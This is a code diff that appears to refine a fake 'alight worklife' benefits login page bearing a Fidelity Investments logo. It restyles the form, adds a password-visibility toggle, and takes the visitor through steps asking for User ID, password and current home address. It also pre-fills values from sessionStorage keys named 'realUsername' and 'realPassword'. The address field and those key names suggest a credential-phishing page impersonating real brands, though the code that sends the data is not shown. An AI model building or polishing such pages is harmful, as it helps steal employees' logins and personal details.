@@ -20,8 +20,6 @@
             background-repeat: no-repeat;
             background-attachment: fixed;
             position: relative;
-            min-width: 100%;
-            height: 100%;
             align-items: flex-end;
             padding: 40px 25px 180px;
         }
@@ -29,10 +27,8 @@
         body::before {
             content: '';
             position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
             background: rgba(0, 0, 0, 0.45);
             z-index: -1;
         }
@@ -41,20 +37,13 @@
             text-align: center; 
             margin: 40px 0 30px; 
             z-index: 2; 
-            position: relative;
-        }
-        .fidelity-logo {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-top: 10px;
-            background-color: white;
         }
         .fidelity-logo img {
             width: 190px;
             height: auto;
-            padding: 8px 12px; 
-            margin-top: 10px;
+            padding: 8px 12px;
+            background: white;
+            border-radius: 8px;
         }
 
         .alight-worklife {
@@ -68,40 +57,54 @@
             background: linear-gradient(90deg, #7ed957, #34d399);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            font-weight: 700;
         }
 
         .form-container { 
             width: 100%; 
             max-width: 380px; 
-            background: rgba(255, 255, 255, 0.96);
-            padding: 35px 30px;
-            border-radius: 12px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            background: rgba(255, 255, 255, 0.97);
+            padding: 40px 30px;
+            border-radius: 16px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.25);
             z-index: 2;
-            position: relative;
         }
 
         label { 
             display: block; 
-            margin: 25px 0 8px; 
+            margin: 20px 0 8px; 
             font-size: 1.05rem; 
             color: #1e2937; 
-            font-weight: 500; 
+            font-weight: 600; 
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 10px;
         }
 
         input { 
             width: 100%; 
             padding: 14px 16px; 
-            border: none; 
-            border-bottom: 1.5px solid #cbd5e1; 
+            border: 1.5px solid #e2e8f0; 
+            border-radius: 10px; 
             font-size: 1.1rem; 
-            background: transparent; 
+            background: #fff;
         }
 
         input:focus { 
             outline: none; 
-            border-bottom-color: #3b82f6; 
+            border-color: #1e40af; 
+            box-shadow: 0 0 0 3px rgba(30, 64, 175, 0.1);
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #64748b;
+            font-size: 1.3rem;
         }
 
         .login-btn { 
@@ -113,7 +116,7 @@
             border-radius: 50px; 
             font-size: 1.2rem; 
             font-weight: 600; 
-            margin: 15px 0; 
+            margin: 25px 0 10px; 
             cursor: pointer; 
         }
 
@@ -135,17 +138,12 @@
             color: #0052cc;
             background-color: #f0f7ff;
             padding: 16px 20px;
-            margin: 20px 0;
+            margin: 25px 0;
             border-left: 5px solid #0052cc;
-            border-radius: 6px;
-            line-height: 1.6;
-            text-align: left;
-            box-shadow: 0 2px 8px rgba(0, 82, 204, 0.1);
+            border-radius: 8px;
         }
 
         .helper-text {
-            display: block;
-            margin-top: 6px;
             font-size: 13px;
             color: #0052cc;
             font-weight: 500;
@@ -157,7 +155,7 @@
             display: flex;
             justify-content: center;
             gap: 10px;
-            margin-bottom: 25px;
+            margin-bottom: 30px;
         }
         .dot {
             width: 10px;
@@ -174,53 +172,51 @@
             <span class="alight">alight</span>
             <span class="worklife">worklife</span><span style="font-size:0.6rem; vertical-align: super; color:#1a1a1a;">®</span>
         </div>
-
         <div class="fidelity-logo">
             <img src="fidelity.jpg" alt="Fidelity Investments">
         </div>
-
         <div class="worklife">Same Login used to access benefits on alight Worklife web</div>
     </div>
 
     <div class="form-container">
         <form id="loginForm">
-
-            <!-- Progress Dots -->
             <div class="progress">
                 <div class="dot active" id="dot1"></div>
                 <div class="dot" id="dot2"></div>
                 <div class="dot" id="dot3"></div>
             </div>
 
-            <!-- Step 1: UserID -->
+            <!-- Step 1 -->
             <div id="step1" class="step active">
-                <label for="username">Enter your UserID</label>
-                <input type="text" id="username" placeholder="UserID" required>
+                <label for="username">User ID</label>
+                <input type="text" id="username" placeholder="Enter your User ID" required>
                 <small class="helper-text">Same ID used to access benefits on alight Worklife web</small>
                 <button type="button" class="next-btn" onclick="nextStep(2)">Next</button>
             </div>
 
-            <!-- Step 2: Password -->
+            <!-- Step 2 -->
             <div id="step2" class="step">
-                <label for="password">Enter your Password</label>
-                <input type="password" id="password" placeholder="Password" required>
+                <label for="password">Password</label>
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="Enter your password" required>
+                    <span class="toggle-password" onclick="togglePassword()">👁</span>
+                </div>
                 <button type="button" class="next-btn" onclick="nextStep(3)">Next</button>
-                <button type="button" onclick="prevStep(1)" style="background:none; border:none; color:#64748b; margin-top:10px;">Back</button>
+                <button type="button" onclick="prevStep(1)" style="background:none; border:none; color:#64748b; margin-top:12px;">← Back</button>
             </div>
 
-            <!-- Step 3: Address + Submit -->
+            <!-- Step 3 -->
             <div id="step3" class="step">
                 <label>Home Address (Current)</label>
                 <input type="text" id="address" placeholder="Enter your current home address" required>
                 
-                <div class="forgot-link" style="text-align: right; margin: 15px 0;">
-                    <a href="forgot.html" style="color: #1e40af; font-size: 0.9rem;">Forgot Password?</a>
+                <div style="text-align: right; margin: 15px 0;">
+                    <a href="forgot.html" style="color: #1e40af; font-size: 0.95rem; text-decoration: none;">Forgot Password?</a>
                 </div>
 
                 <button type="submit" class="login-btn">LOG IN</button>
-                <button type="button" onclick="prevStep(2)" style="background:none; border:none; color:#64748b;">Back</button>
+                <button type="button" onclick="prevStep(2)" style="background:none; border:none; color:#64748b;">← Back</button>
             </div>
-
         </form>
     </div>
 
@@ -248,11 +244,22 @@
             updateProgress();
         }
 
+        function togglePassword() {
+            const passInput = document.getElementById('password');
+            const toggle = document.querySelector('.toggle-password');
+            if (passInput.type === "password") {
+                passInput.type = "text";
+                toggle.textContent = "🙈";
+            } else {
+                passInput.type = "password";
+                toggle.textContent = "👁";
+            }
+        }
+
         // Auto-fill after password reset
         window.onload = function() {
             const savedUsername = sessionStorage.getItem('realUsername');
             const savedPassword = sessionStorage.getItem('realPassword');
-
             if (savedUsername) document.getElementById('username').value = savedUsername;
             if (savedPassword) document.getElementById('password').value = savedPassword;
         };
